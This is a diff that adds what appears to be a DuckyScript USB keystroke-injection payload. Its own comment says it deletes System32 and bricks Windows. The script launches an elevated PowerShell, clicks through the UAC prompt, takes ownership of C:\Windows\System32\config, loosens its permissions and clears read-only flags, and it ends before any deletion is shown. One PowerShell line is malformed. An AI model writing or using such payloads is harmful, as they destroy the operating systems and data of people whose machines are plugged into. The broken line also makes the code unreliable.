@@ -1,0 +1,23 @@
+REM Created By FruitSnaxx
+REM Dont run, will delete sys32 and brick windows
+
+DELAY 1000
+GUI r
+DELAY 1000 
+STRING Powershell
+DELAY 1000
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFTARROW
+DELAY 500
+ENTER 
+DELAY 1000
+STRING takeown /f C:\Windows\System32\config
+ENTER
+DELAY 3000
+STRING cacls C:\Windows\System32\config
+ENTER
+DELAY 500
+STRING C:\Windows\System32/config.IsReadOnly; $file | Set-ItemProperty -name IsReadOnly -Val $false
+ENTER
+DELAY 500
